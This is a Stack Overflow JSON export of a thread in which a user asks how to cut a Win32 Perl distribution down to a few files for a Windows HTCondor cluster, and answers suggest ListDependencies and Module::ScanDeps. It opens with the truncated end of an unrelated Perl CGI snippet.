$ddata-&gt;{'address'}{'city'} ;\n# Here I'd like to receive data from jQuery via ajax.\n#my $id = $cgi-&gt;param('apiKey');\n#$json = qq{{\"ID\" : \"$id\"}};\n#my $method = $cgi-&gt;param('method');\n#my $ip = $cgi-&gt;param('ip');\n\n$json = qq{\"$id\"};\nprint $json;\nexit;\n</code></pre>\n"}, {"tags": ["perl", "par"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1446754773, "post_id": 33553011, "comment_id": 54887491, "body": "You can <i>list</i> the modules that are needed by your program using the very nice <a href=\"http://www.perlmonks.org/?node_id=203148\" rel=\"nofollow noreferrer\"><code>ListDependencies</code> module</a>. To my knowledge it isn&#39;t downloadable anywhere, but it is simple to copy and paste into your own <code>ListDependencies.pm</code> file. You should read the POD documentation within the module for usage instructions"}, {"owner": {"reputation": 193, "user_id": 4033348, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/b2a10557f41f3fe8bbdf31b92c043ed9?s=128&d=identicon&r=PG&f=1", "display_name": "rjt_jr", "link": "https://stackoverflow.com/users/4033348/rjt-jr"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1446756054, "post_id": 33553011, "comment_id": 54888228, "body": "I&#39;m probably only depending on something like 10 modules (just a guess), but in practice that&#39;s probably dozens of files. So I still need some way to condense them down to an archive. It&#39;s the small file copies that are killing me. I don&#39;t think identifying what can be deleted is a super difficult problem. ListDependencies will probably help some, thanks. The issue, though, is mostly getting the file count down somehow."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1446764527, "post_id": 33553011, "comment_id": 54892614, "body": "<i>&quot;10 modules, but in practice that&#39;s probably dozens of files&quot;</i>  Is that based on any real information? I can tell you for certain that there will be <i>nowhere near</i> 2,289 files for ten modules. Most modules -- especially Perl-only modules -- consist of only a single file, and there&#39;s no need for the POD documentation files for the bigger ones. You haven&#39;t given any clue about what dependencies your program is likely to have, so we&#39;re in the dark here. If you dismiss every suggestion you get on a whim, and without giving any detail of the application, then you won&#39;t get any useful answers."}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1446754794, "creation_date": 1446754794, "answer_id": 33554033, "question_id": 33553011, "link": "https://stackoverflow.com/questions/33553011/reduce-relocatable-win32-perl-to-as-few-files-and-bytes-as-possible/33554033#33554033", "title": "Reduce relocatable win32 Perl to as few files and bytes as possible", "body": "<p>You can <em>list</em> the modules that are needed by your program using the very nice <a href=\"http://www.perlmonks.org/?node_id=203148\" rel=\"nofollow\"><code>ListDependencies</code> module</a></p>\n\n<p>To my knowledge it isn't downloadable anywhere, but it is simple to copy and paste into your own <code>ListDependencies.pm</code> file</p>\n\n<p>You should read the POD documentation within the module for usage instructions</p>\n"}, {"comments": [{"owner": {"reputation": 193, "user_id": 4033348, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/b2a10557f41f3fe8bbdf31b92c043ed9?s=128&d=identicon&r=PG&f=1", "display_name": "rjt_jr", "link": "https://stackoverflow.com/users/4033348/rjt-jr"}, "edited": false, "score": 0, "creation_date": 1447200116, "post_id": 33605621, "comment_id": 55058060, "body": "A mix of scandeps.pl and deleting things to see if everything still works seems to be the best I can do."}], "tags": [], "owner": {"reputation": 603, "user_id": 2625346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ee31fca82dd2895bc5eb68ead5f973e?s=128&d=identicon&r=PG", "display_name": "Ivan Baidakou", "link": "https://stackoverflow.com/users/2625346/ivan-baidakou"}, "is_accepted": true, "score": 1, "last_activity_date": 1447254301, "last_edit_date": 1447254301, "creation_date": 1447059871, "answer_id": 33605621, "question_id": 33553011, "link": "https://stackoverflow.com/questions/33553011/reduce-relocatable-win32-perl-to-as-few-files-and-bytes-as-possible/33605621#33605621", "title": "Reduce relocatable win32 Perl to as few files and bytes as possible", "body": "<p>You can use <a href=\"https://metacpan.org/pod/Module::ScanDeps\" rel=\"nofollow\" title=\"Module::ScanDeps\">Module::ScanDeps</a> to get list of actual dependencies of your perl. It was terrible, that it took significant amount of time, when <code>PAR::Packer</code> unpacked the whole application, so I decided to build the executable by myself.</p>\n\n<p><a href=\"https://github.com/basiliscos/iston/blob/master/static-build/pm-gatherer.pl\" rel=\"nofollow\">Here</a> is my ready to use script which gathers perl dependencies into some directory; it might be useful for you to reduce the number of perl-modules, e.g. by manually removing some dependencies after copying.</p>\n\n<p>In theory (I have never tried that), the next your step could be merge all pure-perl dependencies into single file (like <code>deps.pm</code>); although it might be non-trivial due to perl's autoload magic and some other tricks. </p>\n"}], "owner": {"reputation": 193, "user_id": 4033348, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/b2a10557f41f3fe8bbdf31b92c043ed9?s=128&d=identicon&r=PG&f=1", "display_name": "rjt_jr", "link": "https://stackoverflow.com/users/4033348/rjt-jr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 104, "favorite_count": 0, "accepted_answer_id": 33605621, "answer_count": 2, "score": 4, "last_activity_date": 1447254301, "creation_date": 1446751267, "question_id": 33553011, "link": "https://stackoverflow.com/questions/33553011/reduce-relocatable-win32-perl-to-as-few-files-and-bytes-as-possible", "title": "Reduce relocatable win32 Perl to as few files and bytes as possible", "body": "<p>I'm trying to use a perl program on a Windows HTCondor computing cluster. The way HTCondor on windows works is it copies all dependencies into a temporary directory (used as a <code>chroot</code> of sorts) and then it deletes the directory after the specified outputs are moved to a designated place.</p>\n\n<p>If I take only perl.exe and perl514.dll and make a job like this: <code>perl -e \"print qq/hello\\n/\"</code> and tell the cluster to run it 200 times, then each replication winds up taking about 15 seconds, which is acceptable overhead. That's almost all time spent repeatedly copying the files over the network and then deleting them. <code>echo_hello.bat</code> run 200 times takes more like two seconds per replication.</p>\n\n<p>The problem I have is that when I try to use my full blown perl distribution of 55MB and 2,289 files, a single \"hello\" rep takes something like four minutes of copying and deleting, which is unacceptable. When I try to do many runs the disks on the machines grind to a halt trying to concurrently handle all the file operations across all the reps, so it doesn't work at all. I don't know how long it might take to eventually finish because I gave up after half an hour and no jobs had finished.</p>\n\n<p>I figured PAR::Packer might fix the issue, but nope. I tried <code>print_hello.exe</code> created like this: <code>pp -o print_hello.exe -e \"print qq/hello\\n/\"</code>. It still makes things grind to a halt, apparently by swamping the filesystem. I think a PAR::Packer executable makes a ton of temporary files as it pulls out files it needs from the archive. I think the windows file system totally chokes when there are a bunch of concurrent small file operations.</p>\n\n<p>So how can I go about cutting down the perl I built to something like 6MB and a dozen files? I'm really only using a tiny number of core modules and don't need most of the crap in <code>bin</code> and <code>lib</code>, but I have no idea how to proceed ripping out stuff in a sane way.</p>\n\n<p>Is there an automated way to strip away un-needed files and modules?</p>\n\n<p>I know TCL has a bunch of facilities for packing files into a single uncompressed archive that can then be accessed through a \"virtual filesystem\" without expanding the file. Is there some way to do this with perl itself sort of like with PAR? The problem is PAR compresses everything and then has to extract to temporary files, rather than directly work through a virtual filesystem layer. (If I understand correctly.)</p>\n\n<p>My usage of perl is actually as a scripting layer. It's embedded in a simulation. So I'm really running my_simulation.exe which depends on per514.dll, but you get the idea. I also cannot realistically do anything to the HTCondor cluster other than use it. So there's no need to think outside the box on what I should be using instead of perl and what I could administratively tweak in Windows and HTCondor, thanks.</p>\n"}]